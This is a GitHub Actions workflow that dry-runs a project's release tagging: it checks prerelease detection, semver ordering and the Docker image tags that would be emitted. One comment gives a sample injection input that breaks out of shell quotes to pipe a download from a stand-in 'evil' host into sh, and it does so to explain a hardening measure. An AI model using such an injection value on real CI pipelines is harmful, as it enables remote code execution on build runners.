name: Release Dry-Run

# Validates the release workflow's tag-detection and metadata-action
# config WITHOUT pushing a real tag. Triggered manually before cutting
# an RC, or automatically on PRs that touch release.yaml.
#
# Why: this rc cycle (v0.16.1-rc.1 .. rc.5) burned 5 tags fixing CI bugs
# that would have surfaced earlier with a dry-run gate. Each one wasted
# a tag and operator time.
#
# Scope: dry-run validates the prerelease detection step output and the
# tags `docker/metadata-action` would emit for a synthetic ref. Does NOT
# build, push, sign, or create a release.

on:
  workflow_dispatch:
    inputs:
      tag:
        description: 'Synthetic tag to test (e.g. v0.16.1-rc.5 or v0.16.1)'
        required: true
        default: 'v0.16.1-rc.99'
  pull_request:
    branches: [main]
    paths:
      - '.github/workflows/release.yaml'
      - '.github/workflows/release-dry-run.yaml'

permissions:
  contents: read

jobs:
  detect:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0

      - name: Determine test tag
        id: testtag
        env:
          # Route inputs.tag through env so a workflow_dispatch input like
          # `v0.0.0";curl evil|sh;"` cannot break out of the surrounding
          # quotes and execute on the runner. Same hardening pattern as the
          # `${{ github.ref_name }}` interpolations in release.yaml.
          INPUT_TAG: ${{ inputs.tag }}
        run: |
          if [ -n "${INPUT_TAG}" ]; then
            echo "tag=${INPUT_TAG}" >> "$GITHUB_OUTPUT"
          else
            # PR mode — test both shapes to catch each path.
            echo "tag=v0.99.99-rc.1" >> "$GITHUB_OUTPUT"
          fi

      # Mirror the prerelease-detection step from release.yaml. If this
      # falls out of sync with release.yaml the dry-run is meaningless,
      # so the assertion below pins both the input shape and the output
      # values.
      - name: Detect prerelease (mirror of release.yaml)
        id: prerelease
        env:
          TAG: ${{ steps.testtag.outputs.tag }}
        run: |
          if [[ "$TAG" == *-* ]]; then
            echo "is_prerelease=true" >> "$GITHUB_OUTPUT"
          else
            echo "is_prerelease=false" >> "$GITHUB_OUTPUT"
          fi

      - name: Assert prerelease classification
        env:
          TAG: ${{ steps.testtag.outputs.tag }}
          GOT: ${{ steps.prerelease.outputs.is_prerelease }}
        run: |
          # Stable: vX.Y.Z (no `-`). Prerelease: vX.Y.Z-{rc,beta,alpha}.N
          case "$TAG" in
            *-*) WANT="true" ;;
            *)   WANT="false" ;;
          esac
          if [ "$GOT" != "$WANT" ]; then
            echo "::error::tag=$TAG: is_prerelease=$GOT, expected $WANT"
            exit 1
          fi
          echo "OK: tag=$TAG → is_prerelease=$GOT"

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@4d04d5d9486b7bd6fa91e7baf45bbb4f8b9deedd # v4.0.0

      # Mirror the is_newest semver-comparison step. Forces `is_newest=true`
      # in dry-run mode because we can't easily mock the GH release list;
      # the assertion below pins the algorithm logic separately on
      # synthetic inputs.
      - name: Force is_newest=true (dry-run only)
        id: is_newest
        run: echo "is_newest=true" >> "$GITHUB_OUTPUT"

      # Independently exercise the semver-newest algorithm with synthetic
      # tag sets. Catches regressions in the sort -rV invocation (e.g.,
      # forgetting -V, missing -u, wrong tail/head) without needing a
      # real release.
      - name: Assert is_newest algorithm
        run: |
          # Helper: returns "true" if CURRENT is the newest of (CURRENT + EXISTING…).
          newest() {
            local current="$1"; shift
            local newest
            newest=$( ( for t in "$@"; do echo "$t"; done; echo "$current" ) | sort -rV -u | head -1 )
            [ "$newest" = "$current" ] && echo "true" || echo "false"
          }

          # Stable beats its own RCs.
          [ "$(newest v0.16.1 v0.16.1-rc.5 v0.16.0)" = "true" ] || { echo "::error::stable should beat its own rc"; exit 1; }
          # Newer-minor RC beats older stable.
          [ "$(newest v0.17.0-rc.1 v0.16.1)" = "true" ] || { echo "::error::newer-minor rc should beat older stable"; exit 1; }
          # Older stable hot-patch should NOT be newest when newer stable exists.
          [ "$(newest v0.15.6 v0.16.1 v0.17.0-rc.1)" = "false" ] || { echo "::error::hot-fix on old branch must not be newest"; exit 1; }
          # First release ever (no prior tags) — trivially newest.
          [ "$(newest v0.1.0)" = "true" ] || { echo "::error::first-ever release should be newest"; exit 1; }
          # rc.2 beats rc.1 of same target.
          [ "$(newest v0.16.1-rc.2 v0.16.1-rc.1)" = "true" ] || { echo "::error::rc.2 should beat rc.1"; exit 1; }
          echo "OK: is_newest algorithm correct on all 5 cases"

      # Run docker/metadata-action with the same tag rules as
      # release.yaml. Assert the emitted tag list is what we expect for
      # the synthetic input — catches a regression in the rules block
      # (e.g., someone removing the `enable=` guard, swapping pattern=v
      # back to type=semver, etc.) BEFORE a real RC is cut.
      - name: Docker metadata (mirror of release.yaml)
        id: meta
        uses: docker/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf # v6.0.0
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=raw,value=${{ steps.testtag.outputs.tag }}
            type=semver,pattern={{version}},value=${{ steps.testtag.outputs.tag }}
            type=semver,pattern={{major}}.{{minor}},value=${{ steps.testtag.outputs.tag }},enable=${{ steps.prerelease.outputs.is_prerelease == 'false' }}
            type=raw,value=latest,enable=${{ steps.prerelease.outputs.is_prerelease == 'false' }}
            type=raw,value=preview,enable=${{ steps.is_newest.outputs.is_newest == 'true' }}

      - name: Assert tag matrix
        env:
          TAG: ${{ steps.testtag.outputs.tag }}
          IS_PRE: ${{ steps.prerelease.outputs.is_prerelease }}
          TAGS_OUT: ${{ steps.meta.outputs.tags }}
          REPO: ${{ github.repository }}
        run: |
          BARE="${TAG#v}"
          MAJOR_MINOR="$(echo "$BARE" | cut -d. -f1-2)"

          echo "--- emitted tags ---"
          echo "$TAGS_OUT"
          echo "---"

          # Both forms (v-prefix and bare-semver) must always be there.
          # The original "metadata-action filters pattern=v{{version}} for
          # prereleases" bug surfaced here.
          echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${TAG}" \
            || { echo "::error::missing v-prefixed tag :${TAG}"; exit 1; }
          echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${BARE}" \
            || { echo "::error::missing bare-semver tag :${BARE}"; exit 1; }

          # Stable-only tags must be ABSENT for prereleases.
          if [ "$IS_PRE" = "true" ]; then
            if echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:latest"; then
              echo "::error:::latest emitted for prerelease — would displace stable"
              exit 1
            fi
            if echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${MAJOR_MINOR}"; then
              echo "::error:::${MAJOR_MINOR} emitted for prerelease — would displace stable"
              exit 1
            fi
          fi

          # Stable tags must be PRESENT for stable.
          if [ "$IS_PRE" = "false" ]; then
            echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:latest" \
              || { echo "::error:::latest missing for stable release"; exit 1; }
            echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${MAJOR_MINOR}" \
              || { echo "::error:::${MAJOR_MINOR} missing for stable release"; exit 1; }
          fi

          # :preview is gated by is_newest (forced true in dry-run); MUST
          # be present here. In production release.yaml it's gated by
          # the real semver comparison.
          echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:preview" \
            || { echo "::error:::preview missing — is_newest gate misconfigured"; exit 1; }

          echo "OK: tag matrix is correct for tag=$TAG (is_prerelease=$IS_PRE)"
